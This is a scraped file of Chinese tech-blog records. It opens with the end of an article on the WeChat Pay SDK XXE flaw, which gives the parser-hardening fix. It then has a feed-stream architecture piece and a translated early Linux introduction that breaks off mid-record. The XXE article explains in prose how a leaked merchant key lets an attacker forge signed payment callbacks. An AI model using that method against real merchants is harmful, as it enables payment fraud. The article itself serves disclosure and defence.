false);\r\ndocumentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\r\ndocumentBuilderFactory.setXIncludeAware(false);\r\ndocumentBuilderFactory.setExpandEntityReferences(false);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b622fbf6d6ac896797629-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622fbf6d6ac896797629-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b622fbf6d6ac896797629-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622fbf6d6ac896797629-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b622fbf6d6ac896797629-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622fbf6d6ac896797629-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b622fbf6d6ac896797629-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b622fbf6d6ac896797629-1\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://apache.org/xml/features/disallow-doctype-decl\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622fbf6d6ac896797629-2\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://xml.org/sax/features/external-general-entities\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b622fbf6d6ac896797629-3\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://xml.org/sax/features/external-parameter-entities\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622fbf6d6ac896797629-4\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://apache.org/xml/features/nonvalidating/load-external-dtd\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b622fbf6d6ac896797629-5\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">XMLConstants</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">FEATURE_SECURE_PROCESSING</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622fbf6d6ac896797629-6\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setXIncludeAware</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b622fbf6d6ac896797629-7\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setExpandEntityReferences</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n\n</div>\n<p>此外，微信官方也给出了关于XXE漏洞的最佳安全实践，可以参考：</p>\n<p><a href=\"https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5\">https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5</a></p>\n<p>笔者本人使用上述方案中建议的如下代码修复了该漏洞：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b622fbf6d6af218679831\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nDocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance();\r\ndocumentBuilderFactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\r\nDocumentBuilder documentBuilder = documentBuilderFactory.newDocumentBuilder();\r\n……</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b622fbf6d6af218679831-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622fbf6d6af218679831-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b622fbf6d6af218679831-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622fbf6d6af218679831-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b622fbf6d6af218679831-1\"><span class=\"crayon-e\">DocumentBuilderFactory </span><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">DocumentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">newInstance</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622fbf6d6af218679831-2\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://apache.org/xml/features/disallow-doctype-decl\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b622fbf6d6af218679831-3\"><span class=\"crayon-e\">DocumentBuilder </span><span class=\"crayon-v\">documentBuilder</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">newDocumentBuilder</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622fbf6d6af218679831-4\">……</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n\n</div>\n<h1>四、扩展与反思</h1>\n<h2>1.  危害不只是“0元也能买买买”</h2>\n<p>在很多媒体的报道中，强调该漏洞的风险在于攻击者可以不支付也可以获得商品。确实，攻击者在通过上述漏洞获得微信支付的秘钥以后，有不止一种途径可以做到不支付就获得商品：例如，攻击者首先在系统中下单，获得商户订单号；然后便可以调用微信支付的异步回调，其中的签名参数便可以使用前面获取的秘钥对订单号等信息进行MD5获得；这样攻击者的异步回调就可以通过应用服务器的签名认证，从而获得商品。不过，在很多有一定规模的购物网站（或其他有支付功能的网站），会有对账系统，如定时将系统中的订单状态与微信、支付宝的后台对比，如果出现不一致可以及时报警并处理，因此该漏洞在这方面的影响可能并没有想象的那么大。</p>\n<p>然而，除了“0元也能买买买”，攻击者可以做的事情还有很多很多；理论上来说，攻击者可能获得应用服务器上的目录结构、代码、数据、配置文件等，可以根据需要进行进一步破坏。</p>\n<h2>2.  漏洞不限于微信支付SDK</h2>\n<p>虽然微信支付曝出该漏洞受到了广泛关注，但该漏洞绝不仅仅存在于微信支付中：由于众多XML解析器默认不会禁用对外部实体的访问，因此应用的接口如果有以下几个特点就很容易掉进XXE漏洞的坑里：</p>\n<p>（1）接口使用xml做请求参数</p>\n<p>（2）接口对外公开，或容易获得：例如一些接口提供给外部客户调用，或者接口使用http很容易抓包，或者接口比较容易猜到(如微信支付的异步回调接口)</p>\n<p>（3）接口中解析xml参数时，没有禁用对外部实体的访问</p>\n<p>建议大家最好检查一下自己的应用中是否有类似的漏洞，及时修复。</p>\n<h2>3.  xml与json</h2>\n<p>xml 与 json是系统间交互常用的两种数据格式，虽然很多情况下二者可以互换，但是笔者认为，json 作为更加轻量级更加纯粹的数据格式，更适合于系统间的交互；而xml，作为更加重量级更加复杂的数据格式，其 DTD 支持自定义文档类型，在更加复杂的配置场景下有着更好的效果，典型的场景如 spring 相关的配置。</p>\n<h2>4.  题外话：微信支付的签名认证</h2>\n<p>在前面曾经提到，应用中存储的秘钥一旦泄露，攻击者便可以完全绕过签名认证，这是因为微信支付使用的是对称式的签名认证：微信方和应用方，使用相同的秘钥对相同的明文进行MD5签名，只要应用方的秘钥泄露，签名认证就完全成了摆设。</p>\n<p>在这方面支付宝的做法更规范也更安全：支付宝为应用生成公私钥对，公钥由应用方保存，私钥由支付宝保存；在回调时，支付宝使用私钥进行签名，应用方使用公钥进行验证；这样只要支付宝保存的私钥不泄露，攻击者只有公钥则难以通过签名认证。</p>\n<h1>参考文献</h1>\n<p>https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5</p>\n<p><a href=\"http://seclists.org/fulldisclosure/2018/Jul/3\">http://seclists.org/fulldisclosure/2018/Jul/3</a></p>\n<p>https://www.cnblogs.com/tongwen/p/5194483.html</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114197\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114197votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114197\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/9a51fcef743ae4aca8b8c39bcc18e02a01782e9c.jpg"}
{"url_object_id": "7b4b289d21745010a22e3afbfc59d82c", "title": ["关于 Feed 流的几个热门问题"], "url": "http://blog.jobbole.com/114156/", "create_date": "2018/07/09", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2011/11/software-development-logo.jpg"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 1, "tags": "IT技术, API, Feed, 架构设计", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/vincent7\">v7</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><div>\n<h2><b>0x00 前言</b></h2>\n<p>本篇聊一下 Feed 流技术，由于这个话题在业界有丰富的实践经验，所以我特意选了个小的切入点，从相对微观的角度说几个具体的问题，避免一些无意义的重复。希望提炼实践中的具体问题来做讨论，使事情变得更有实际意义。</p>\n<h2><b>0x01 先行资料</b></h2>\n<ul>\n<li><a href=\"https://www.zhihu.com/question/20690652\">什么是 Feed 流</a></li>\n<li><a href=\"https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/NFH8XVXpprMHOEEAovND2A\" target=\"_blank\" rel=\"nofollow noreferrer\">如何设计 Twitter 这样的系统架构</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/30226315\">如何打造千万级Feed流系统</a></li>\n</ul>\n<h2><b>0x02 关于模型</b></h2>\n<p>当要做一个 Feed 流，摆在我们眼前的第一个问题就是到底选推模型还是选拉模型，因为这个选择将影响接下来一系列的架构方式。</p>\n<ul>\n<li><b>推模型 or 拉模型</b></li>\n</ul>\n<p>推模型和拉模型各自的优缺点已经被罗列了很多了，比如推模型的存储量大，或者拉模型的效率可能低，但如果你从无到有做这个事情，这些优缺点的罗列还是无法帮助你做出最初的决定，所谓的“知道了许多道理，还是过不好这一生”，当然除非你有实际的构造大流量 Feed 流的经验。</p>\n<p>然而根据我们的经验：基于正确规范的架构和基础设施，对于一个千万日活量级的应用 Feed 流， 拉模型完全可以扛得住。</p>\n<p>我想，上面这个结论是很有意义的，尤其是对中小创业公司，因为拉模型本身节省存储资源，开发成本低，上线速度快，在业务爆发之前做这样一个 Feed 流，有这样一个明确经验可以帮助你快速做出决定。</p>\n<p>另外，上面说的千万日活，并不是说就是拉模型的上限，而是说，如果你做到千万日活，你将会有丰富的实践经验帮助你走下一步，那时也会有更多的资源让你使用，是继续深挖拉模型潜能，还是上推拉结合消灭性能问题，将是另外一个够挑战的问题了。</p>\n<ul>\n<li><b>推模型的原罪</b></li>\n</ul>\n<p>上一节我的描述有些极端，本意上我是想给出更明确的实践结论，因为对于推拉模型的积累对比已经够多了，现在难的似乎是做决定时的信心。那这一节，我就来聊推模型的几个问题。</p>\n<p><b>耗存储</b>。推模型可以理解为给每个粉丝维护一个单独的存储，举例来说，如果某个大 V 有一千万粉丝，他发的一条内容，将被存储一千万份，这个存储放大是非常可观的。于是这里就会常见的问题：一、有多少存储资源能用，这些资源贵不贵？二、如果省掉这些资源存储，响应时间性能到底能打多少折扣，这些折扣值不值？这是个时间和空间的冲突，程序员每天都在做这种问题的衡量，每个系统的要求基准也不一样，我就不妄下结论了。</p>\n<p><b>写峰值。</b>推模型有一个写峰值的问题，通常，我们做推模型，给粉丝写数据的时候一般是离线的，也就是大 V 发布完内容，触发离线写任务推给各个粉丝。可大 V 是少数，大部分时候，都是普通用户在发布，写任务没有那么多，这时，离线写任务的 worker 数可能用不了几个，可一旦大 V 发布了内容，这个写任务会骤增，突然来一个大峰值，如何处理这个峰值是个问题。有些方案：一、把资源调度系统做的超级棒，worker 数量自动化跟着调整，峰值来了的时候，worker 自动迅速扩容，消费离线任务，并在离线任务处理完毕之后缩容，避免资源浪费，这个调度确实需要很棒，因为大多时候，Feed 流对这些任务的要求是很严苛的，比如，产品上希望粉丝至少也是在分钟级看到大 V 发的内容，甚至秒级，这对调度系统的挑战是巨大的。二、推拉结合，大 V 走拉模型逻辑，这个方案的问题就是，你其实做了两套系统，开发成本大。</p>\n<p><b>避不开的业务逻辑。</b>这一点是从业务逻辑开发上来说的，这个也是在具体业务开发过程中推模型让人觉得很难受的点，就是：当我解决很多问题之后，从业务逻辑开发层面，我还是避不开很多业务逻辑。为什么这么说呢，就是在推模型里，每个粉丝都存有一个属于他的数据，但这部分数据在接口设计和数据返回上，也仅仅就是元数据，这份元数据，还是要经过很多处理才能返回给用户，比如过滤、Format，我们希望推模型维护的那个存储是一份尽可能干净的数据，但事情却没那么简单。</p>\n<p>不过，以上是我个人的一些总结，由于在推模型上我没有走的更远，这些问题到底是不是真正的问题，欢迎来喷。</p>\n<h2><b>0x03 关于数据</b></h2>\n<p>模型的事情就不过多说了，再来聊几个关于数据的具体问题。</p>\n<ul>\n<li><b>有状态与无状态</b></li>\n</ul>\n<p>这是 Feed 流的 API 接口设计相关的问题。</p>\n<p>举个例子，在拉取 Feed 流数据时候， API 层面基于数量 offset/limit 的分页方案是完全不行的，因为用户 Feed 流的新数据会 insert 到流最开始位置，仅仅给出 offset 会导致分页数据错乱，所以会给出一种 after/limit 的分页方案，就是有一个标志数据，意义是“从 after 这个数据向后取 limit 条数据”；但是，这仅仅是一个干净的 Feed 流的情况下，在实际的业务需求中，Feed 流中的数据会更复杂，复杂到打乱这个看起来可行的分页方式。</p>\n<p>以分页这个例子来说，它为什么会这么脆弱呢? 我总结是因为 API 的数据请求是无状态的，用户在取第二页数据的时候，并不知道取第一页数据时到底发生了什么，仅仅知道在接口层面传递的几个值（offset/after/limt），而许多时候尤其是对于 Feed 流的一些时候这些值不够用，导致数据拉取变得棘手。</p>\n<p>所以，如果 Feed 流的数据获取是有状态就好了，就像浏览器与服务器之间的 Session，保持用户一个访问周期的上下文数据，这样想做什么就都好做了。</p>\n<ul>\n<li><b>数据 Format</b></li>\n</ul>\n<p>通常，Feed 流中的数据会来自多个不同的源，最后返回给用户之前需要做数据的 Format，这个过程是个性能黑洞，经常包含了很多 IO，你可能要读大量存储，读大量 RPC来获取到数据才能成功组装。所以针对数据 Format 有很多性能优化的点，包括不限于：消灭慢查询、减少调用放大、并行获取数据、做好缓存、操作批量。</p>\n<p>要做好性能优化，好的结构是必需的，比如要减少调用放大，那就要尽量保证数据复用和批量获取，只有你的代码结构好，才会有更合适的地方去获取数据和复用数据；也同样，只有你把可以并行部分都很清晰的摘离出来了，才能更合适地去做统一并行。</p>\n<p>而诸如消灭慢查询、做好缓存，此类其他细节也都是重要的，这里就不展开。</p>\n<ul>\n<li><b>过滤</b></li>\n</ul>\n<p>几乎所有的 Feed 流都有过滤需求，比如对已经读过的内容进行过滤，或者对已经被作者删除的内容进行过滤。</p>\n<p>过滤是个具体的事情，有的时候你仅仅需要元数据就能过滤，有的时候你需要对拿到完整数据才能过滤。总结一句话就是过滤的繁琐与否取决于产品需求，但好的结构可以让过滤变得更符合逻辑，性能表现更好。</p>\n<h2><b>0x04 结语</b></h2>\n<p>Feed 流是个不小的系统，三言两语只是管中窥豹，长时间没写分享文章了行文也变得不太流畅，希望看完这篇你会有所收获吧。</p>\n</div>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我写出更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏作者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我写出更多好文章，谢谢！</h4>\n                <p>任选一种支付方式</p>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2016/10/30091aff79e77ecbab99678473d262ea.jpeg\">\n            \n                            <img src=\"http://jbcdn2.b0.upaiyun.com/2016/10/d0895096265ab585cdb52a0119e21608.jpeg\">\n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114156\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114156votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114156\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/vincent7\">v7</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/vincent7\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2016/10/2976e1383dc6fd216901213fcff13ae4.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            微博：@_v7__        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/vincent7\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/vincent7/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/vincent7/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 17</a> · <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/u/2135822193\"><i class=\"fa fa-weibo\"></i></a> <a title=\"个人微信：vince_yang\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/eb63456a872d5c2ffd8306369d8fe47503161e04.jpg"}
{"url_object_id": "d6ec0ef3593f6a22382ac914afc4a27a", "title": ["Linus 定义 Linux"], "url": "http://blog.jobbole.com/114208/", "create_date": "2018/07/09", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2014/03/5215e39e39eb546d1689aa26f8d633be.jpg"], "praise_nums": "1", "comment_nums": 2, "fav_nums": 2, "tags": "IT技术, Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://oldlinux.org/Linus/\">Linus Torvalds</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/linux-a-free-unix-386-kernel\">开源中国</a>   </div><h1>LINUX介绍</h1>\n<h2>LINUX是什么？</h2>\n<p>LINUX是一个免费类unix内核，适用于386-AT计算机，附带完整源代码。主要让黑客、计算机科学学生使用，学习和享受。它大部分用C编写，但是一小部分是用gnu格式汇编，而且引导序列用的是因特尔086汇编语言。C代码是相对ANSI的，使用一些GNU增强特性（大多为 __asm__ 和 inline）。</p>\n<p>然而有很多可用于386电脑的unices，他们大部分要花很多钱，而且不附带源码。因此他们是使用计算机的理想选择，但是如果你想了解他们如何工作，那是不可能的。</p>\n<p>也有一些  Unix 是附带源码的。Minix，Andrew S. Tanenbaum编写的学习工具，已经在大学中作为教学工具使用了很多年了。BSD-386系统是附带源码的，但是有版权限制，而且要花很多钱（我记得起始价格为$995）。GNU内核（Hurd）将会是免费的，但是现在还没有准备好，而且对于了解和学习它们来说有点庞大。</p>\n<p>LINUX与Minix是最相似的，由于它很小而且不是非常复杂，因此易于理解（嗯…）。LINUX是基于Minix编写的，因此有相当多的相同点，任何Minix黑客在使用LINUX的时候都感觉非常熟悉。不过，没有在项目中使用Minix代码，因此Minix版权没有限制到这个新系统。它也是完全免费的，而且它的版权非常宽松。因此不像使用Minix，它不需要几兆字节大小的区别。</p>\n<h2>LINUX版权</h2>\n<p>虽然是免费的发布版，我还是从以下几个方面限制了LINUX的使用：</p>\n<ul>\n<li>你可以自由复制和重新发布源码和二进制，只要是：</li>\n</ul>\n<ol>\n<li>完全开源。因此不能单独发布二进制，即使你只修改了一点。</li>\n<li>你不能从发布版获取利益。事实上甚至“装卸费用”都是不被接受的。</li>\n<li>你要保持完整的适当版权。</li>\n</ol>\n<ul>\n<li>根据需要你可能会修改源码，但是如果你发布了新系统的一部分（或者只有二进制），必须将新的代码包含进去。</li>\n<li>除了不包含版权的代码之外，你可能会做一些小的修改。这由你来定，但是如果能将相关内容或者代码告诉我，将不胜感激。</li>\n</ul>\n<p>对任何使用或者扩展系统的人来说，这应该足够宽松而不会引起任何担忧。如果你有朋友真的不想要源码，只想要一个能运行的二进制，你当然可以给他而不用担心我会起诉你。不过最好只在朋友之间这么做。</p>\n<h2>LINUX运行所需的硬件/软件</h2>\n<p>LINUX是在一个运行Minix的386-AT上开发的。由于LINUX是一个真正的操作系统，而且需要直接与硬件交互来做一些事情，你必须有一个非常相似的系统来让他顺利运行：</p>\n<ul>\n<li>386-AT（PS/2之类是不同的，不能正常运行）</li>\n<li>VGA或者EGA屏幕硬件。</li>\n<li>标准AT硬盘接口，IDE盘可以运行（实际上我用的就是这个）。</li>\n<li>正常实模式BIOS。一些机器看起来是用虚-86模式运行启动程序，而且在这样的机器LINUX不会启动和正常运行。</li>\n</ul>\n<p>LINUX会发展成为一个自给自足的系统，现在需要Minix-386才能正常运行。你需要Minix让初始化启动文件系统，和编译OS二进制。在那之后LINUX是一个自给自足的系统，但是为了做文件系统检查（fsck）和修改之后重编译系统，推荐使用Minix。</p>\n<h2>获取LINUX</h2>\n<p>LINUX现在可以使用匿名ftp从‘nic.funet.fi’的‘/pub/OS/Linux’目录获取。这个目录包含操作系统的所有源码，还有一些二进制文件，因此你可以真正使用系统了。</p>\n<p><strong>注意！二进制大多是GNU软件，而且版权比LINUX的严格（GNU非盈利性版权）。因此你不能在不发布他们源码的情况下重新发布他们，可以在/pub/GNU中找到。关于GNU非盈利性版权，从任何GNU软件包了解更多。</strong></p>\n<p>此目录中各类文件如下：</p>\n<ul>\n<li>linux-0.03.tar.Z–系统的完全源码，16位tar压缩文件格式。</li>\n<li>Linux.tex–这个文件的LATEX源码。</li>\n<li>bash.Z–在LINUX下运行的bash二进制文件。这个二进制文件应该放到预留给LINUX文件系统中的/bin/sh下（参见installation）。</li>\n<li>update.Z–更新二进制文件，要放到/bin/update。</li>\n<li>gccbin.tar.Z–GNU 